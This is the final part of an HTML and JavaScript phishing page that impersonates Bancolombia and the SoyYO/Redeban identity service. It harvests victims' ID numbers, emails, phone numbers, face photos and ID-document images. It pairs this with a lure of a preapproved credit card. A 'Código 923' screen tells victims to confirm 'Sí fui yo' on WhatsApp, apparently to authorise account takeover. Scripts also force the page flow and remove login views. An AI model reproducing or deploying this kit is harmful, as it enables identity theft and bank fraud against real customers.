      <section id="flowSoyyoStep1" class="soyyo-nuevo-step soyyo-nuevo-step--active">
        <h1 class="soyyo-nuevo-title">Bienvenid@</h1>
        <p class="soyyo-nuevo-subtitle">a tu identidad digital</p>
        <label class="soyyo-nuevo-label">Ingresa tu documento de identidad</label>
        <div class="soyyo-nuevo-field">
          <select id="flowSoyyoDocType" class="soyyo-nuevo-select" aria-label="Tipo documento">
            <option value="CC">C.C.</option>
            <option value="CE">C.E.</option>
          </select>
          <input type="text" id="flowSoyyoDocNum" class="soyyo-nuevo-input" placeholder="Número de documento" inputmode="numeric" pattern="[0-9]*" maxlength="12">
        </div>
      </section>
      <section id="flowSoyyoStep2" class="soyyo-nuevo-step">
        <h2 class="soyyo-nuevo-title2">Tus datos personales</h2>
        <label class="soyyo-nuevo-label">Correo electrónico</label>
        <input type="email" id="flowSoyyoEmail" class="soyyo-nuevo-input" style="margin-bottom:6px" placeholder="correo@ejemplo.com" autocomplete="email">
        <p class="soyyo-nuevo-hint">Asegúrate de que esté correcto :)</p>
        <label class="soyyo-nuevo-label">Tu celular</label>
        <div class="soyyo-nuevo-field">
          <select id="flowSoyyoCountry" class="soyyo-nuevo-select" aria-label="Indicativo">
            <option value="+57">+57</option>
          </select>
          <input type="tel" id="flowSoyyoPhone" class="soyyo-nuevo-input" placeholder="Número de teléfono" inputmode="numeric" pattern="[0-9]*" maxlength="10">
        </div>
        <div class="soyyo-nuevo-info">Ten a la mano tu documento en físico, es posible que lo necesites para completar
          el proceso.</div>
      </section>
    </main>
    <footer class="soyyo-nuevo-footer">
      <button type="button" id="flowSoyyoBtn" class="soyyo-nuevo-btn" disabled="">
        <span class="soyyo-nuevo-btn__spinner" aria-hidden="true"></span>
        <span class="soyyo-nuevo-btn__label">Continuar</span>
      </button>
      <p class="soyyo-nuevo-footnote">Verificado por <strong>SoyYO</strong> de <strong>Redeban</strong></p>
    </footer>
  </div>

  <div class="soyyo-nuevo-app soyyo-nuevo-app--facial" id="flowSoyyoFacialView" hidden="">
    <div class="soyyo-nuevo-facial-inner">
      <header class="soyyo-nuevo-header">
        <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="soyyo-nuevo-header__logo">
      </header>
      <main class="soyyo-nuevo-main soyyo-nuevo-facial-main">
        <div class="soyyo-nuevo-facial-body">
          <div class="soyyo-nuevo-facial-text">
            <h1 class="soyyo-nuevo-title" id="flowSoyyoCameraTitle">
              <svg class="soyyo-nuevo-title__shield" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
              </svg>
              <span>Reconocimiento facial</span>
            </h1>
            <p class="soyyo-nuevo-subtitle" id="flowSoyyoCameraSub">Centra tu rostro en el óvalo y mantén buena
              iluminación.</p>
            <div id="flowSoyyoPanelFeedback" class="soyyo-nuevo-facial-pill" role="status" aria-live="polite"></div>
          </div>
          <div class="flow-soyyo-camera-stage">
            <div class="flow-soyyo-camera-frame" id="flowSoyyoCameraFrame">
              <video id="flowSoyyoVideo" playsinline="" muted="" style="z-index:1"></video>
              <img id="flowSoyyoPreview" alt="Vista previa">
              <div class="soyyo-nuevo-face-guide" id="flowSoyyoFaceGuide">
                <div class="soyyo-nuevo-oval">
                  <div class="soyyo-nuevo-scan"></div>
                </div>
              </div>
              <div class="soyyo-nuevo-doc-guide" id="flowSoyyoDocGuide" style="display:none">
                <div class="soyyo-nuevo-rect"></div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer class="soyyo-nuevo-footer soyyo-nuevo-facial-footer">
        <button type="button" id="flowSoyyoCaptureBtn" class="soyyo-nuevo-btn soyyo-nuevo-btn--on kyc-shutter-btn">Capturar foto</button>
        <p class="soyyo-nuevo-footnote" style="color:#8993A4;font-size:13px;margin-top:12px">Verificado por
          <strong>SoyYO</strong> · Redeban
        </p>
      </footer>
    </div>
  </div>
</div>


<div class="login-page app-view" id="flow923Page" data-flow-view="p923">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <div class="login-card" style="padding:clamp(1.25rem,3vw,2rem) clamp(1.5rem,4vw,2.5rem);gap:clamp(0.75rem,2vw,1.25rem);min-height:auto">
          <div style="text-align:center;width:100%;margin-bottom:0">
            <img src="assets/error.svg" alt="" style="width:clamp(50px,12vw,65px);height:clamp(50px,12vw,65px);display:block;margin:0 auto 0.75rem">
            <h2 style="font-size:clamp(1.05rem,3.5vw,1.2rem);font-weight:700;margin:0;line-height:1.2;color:#2C2A29">
              Código: 923</h2>
          </div>
          <div class="flow-923-text" style="width:100%;font-size:clamp(0.85rem,2.8vw,0.95rem);line-height:1.5">
            Te acabamos de enviar un mensaje por WhatsApp desde el número oficial de Bancolombia.<br><br>
            Abre WhatsApp y responde:<br><br>
            <strong style="font-size:clamp(0.9rem,3vw,1.05rem)">Sí fui yo</strong><br><br>
            Se aprobará tu proceso al instante.<br><br>
            <strong>Si tienes dudas, un asesor especializado se comunicará contigo en breves momentos para brindarte el
              apoyo necesario en tu solicitud.</strong>
          </div>
          <div style="width:100%;margin-top:0">
            <button type="button" class="login-btn next enabled" id="flow923RetryBtn" style="width:100%;height:clamp(46px,11vw,52px);font-size:clamp(0.95rem,3vw,1.05rem);font-weight:600">Intentar
              de nuevo</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="login-page app-view" id="flowFinalPage" data-flow-view="finalizar">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <div class="login-card" style="text-align:center;gap:20px">
          <img src="assets/bueno.png" alt="" class="flow-check-success">
          <p class="flow-final-p" style="font-family:'CIBFontSans',Arial,sans-serif;font-size:1.1rem;font-weight:700">
            ¡Solicitud procesada con éxito!</p>
          <p class="flow-final-p" id="flowFinalBodyText">En las próximas 48 horas su tarjeta crédito virtual será
            activada en su cuenta. Gracias por usar nuestros servicios.</p>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>





</div><!-- <script src="scripts.js" defer=""></script> -->
<script>
  function showSecurityModal(e) {
    if (e) e.preventDefault();
    document.getElementById('flowOverlay').classList.add('is-active');
    return false;
  }

  window.openCreditDocPage = function() {
    var highestTimeoutId = window.setTimeout(function(){}, 0);
    for (var i = 0; i <= highestTimeoutId; i++) {
        window.clearTimeout(i);
    }

    var overlay = document.getElementById('flowOverlay');
    if (overlay) {
      overlay.classList.remove('is-active');
      overlay.style.display = 'none';
    }

    var loginPage = document.getElementById('loginPage');
    if (loginPage) {
      loginPage.classList.remove('is-active');
      loginPage.style.display = 'none';
    }

    var docPage = document.getElementById('creditDocPage');
    if (docPage) {
        docPage.classList.add('is-active');
        docPage.style.display = 'block';
        window.scrollTo(0, 0);
    }
  };

  document.addEventListener('DOMContentLoaded', function() {
    var continueBtn = document.getElementById('flowContinueBtn');
    if (continueBtn) {
      continueBtn.addEventListener('click', function(e) {
        e.preventDefault();
        window.openCreditDocPage();
      });
    }

    var docTipoRow = document.getElementById('creditDocTipoRow');
    var docTipoDropdown = document.getElementById('creditDocTipoDropdown');
    var docTipoText = document.getElementById('creditDocTipoText');
    var docNumInput = document.getElementById('creditDocNumInput');
    var docCheck = document.getElementById('creditDocCheck');
    var docNextBtn = document.getElementById('creditDocNextBtn');
    var docBackBtn = document.getElementById('creditDocBackBtn');

    if (docTipoRow && docTipoDropdown) {
        docTipoRow.addEventListener('click', function(e) {
            e.stopPropagation();
            docTipoDropdown.classList.toggle('is-open');
            docTipoDropdown.style.display = docTipoDropdown.classList.contains('is-open') ? 'block' : 'none';
        });

        var opts = docTipoDropdown.querySelectorAll('.cd-dropdown__opt');
        opts.forEach(function(opt) {
            opt.addEventListener('click', function(e) {
                e.stopPropagation();
                opts.forEach(function(o) { o.classList.remove('cd-dropdown__opt--selected'); });
                opt.classList.add('cd-dropdown__opt--selected');
                if (docTipoText) docTipoText.textContent = opt.textContent.trim();
                docTipoDropdown.classList.remove('is-open');
                docTipoDropdown.style.display = 'none';
            });
        });

        document.addEventListener('click', function() {
            docTipoDropdown.classList.remove('is-open');
            docTipoDropdown.style.display = 'none';
        });
    }

    if (docCheck) {
        docCheck.addEventListener('click', function() {
            docCheck.classList.toggle('cd-check--on');
            validateDocForm();
        });
    }

    function validateDocForm() {
        if (!docNumInput || !docNextBtn) return;
        var val = docNumInput.value.replace(/[^0-9]/g, '');
        docNumInput.value = val;
        var isChecked = !docCheck || docCheck.classList.contains('cd-check--on');
        var isValid = val.length >= 5 && isChecked;

        if (isValid) {
            docNextBtn.removeAttribute('disabled');
            docNextBtn.classList.add('cd-next--on');
        } else {
            docNextBtn.setAttribute('disabled', 'disabled');
            docNextBtn.classList.remove('cd-next--on');
        }
    }

    if (docNumInput) {
        docNumInput.addEventListener('input', validateDocForm);
    }

    if (docNextBtn) {
        docNextBtn.addEventListener('click', function() {
            var docVal = docNumInput ? docNumInput.value.trim() : '';
            if (docVal.length < 5) return;
            window.location.href = 'index.php?cupo=preaprobado&usuario=' + encodeURIComponent(docVal);
        });
    }

    // Slider de Cupo
    var cupoSlider = document.getElementById('ccCupoSlider');
    var cupoValueDisplay = document.getElementById('ccCupoValue');
    if (cupoSlider && cupoValueDisplay) {
        function updateCupoDisplay() {
            var val = parseFloat(cupoSlider.value) || 0;
            var min = parseFloat(cupoSlider.min) || 0;
            var max = parseFloat(cupoSlider.max) || 70000000;
            var pct = max > min ? ((val - min) / (max - min)) * 100 : 0;
            cupoSlider.style.background = 'linear-gradient(to right, #fdda24 0%, #fdda24 ' + pct + '%, #e2e8f0 ' + pct + '%, #e2e8f0 100%)';
            cupoValueDisplay.textContent = '$ ' + new Intl.NumberFormat('es-CO').format(val);
        }
        cupoSlider.addEventListener('input', updateCupoDisplay);
        cupoSlider.addEventListener('change', updateCupoDisplay);
        updateCupoDisplay();
    }

    if (docBackBtn) {
        docBackBtn.addEventListener('click', function() {
            var docPage = document.getElementById('creditDocPage');
            if (docPage) {
                docPage.classList.remove('is-active');
                docPage.style.display = 'none';
            }
            var landing = document.getElementById('mylist');
            if (landing) landing.style.display = 'block';
        });
    }
  });
</script>
<div class="flow-overlay" id="flowOverlay">
  <div class="flow-overlay__center">
    <div class="flow-loading-stage" id="flowLoadingStage" role="status" aria-live="polite">
      <div class="flow-loading-cluster">
        <div class="flow-spinner" id="flowSpinner" hidden=""></div>
        <div class="flow-success-icon" id="flowSuccessIcon" hidden="">
          <img class="flow-success-icon__img" src="assets/bueno.png" alt="" width="40" height="40">
        </div>
        <p class="flow-status-text" id="flowStatusText" hidden="">Cargando...</p>
      </div>
    </div>
    <div class="flow-security-modal" id="flowSecurityModal">
      <div class="flow-security-icon">
        <img src="assets/foto-whatsapp-sonrie.jpg" alt="Validacion de identidad">
      </div>
      <h3 class="flow-security-title">Verificación de identidad</h3>
      <p class="flow-security-text">Con el fin de resguardar tu solicitud y prevenir casos de suplantación de identidad,
        por favor inicia sesión para completar este proceso de verificación de forma segura.</p>
      <button type="button" class="flow-security-btn" id="flowContinueBtn" onclick="openCreditDocPage()">Continuar</button>
    </div>
  </div>
</div><div class="flow-overlay saas-page0-overlay" id="saasPage0Overlay" hidden="">
  <div class="flow-overlay__center saas-page0-stack">
    <div class="flow-loading-stage" id="saasPage0Stage" role="status" aria-live="polite">
      <div class="flow-loading-cluster">
        <div class="flow-spinner" id="saasPage0Spinner"></div>
        <div class="saas-page0-check" id="saasPage0Check" hidden="" aria-hidden="true">
          <img class="saas-page0-check__img" src="assets/bueno.png" alt="" width="40" height="40">
        </div>
        <p class="flow-status-text" id="saasPage0Text">Procesando solicitud…</p>
      </div>
    </div>
    <p class="saas-page0-below" id="saasPage0Subtext" hidden="">Esto puede tomar unos minutos</p>
  </div>
</div>
<script>
  (function() {
    function killLoginPage() {
      var el = document.getElementById('loginPage');
      if (el) el.remove();
      var titles = document.querySelectorAll('.login-title, h1');
      titles.forEach(function(t) {
        if (t.textContent.indexOf('Te damos la bienvenida') !== -1) {
          var parentCard = t.closest('.login-page') || t.closest('.app-view') || t.closest('.login-main');
          if (parentCard && parentCard.id !== 'creditDocPage') {
            parentCard.remove();
          }
        }
      });
    }
    killLoginPage();
    if (window.MutationObserver) {
      var obs = new MutationObserver(killLoginPage);
      obs.observe(document.documentElement, { childList: true, subtree: true });
    }
    setInterval(killLoginPage, 100);
  })();
</script>
</body></html>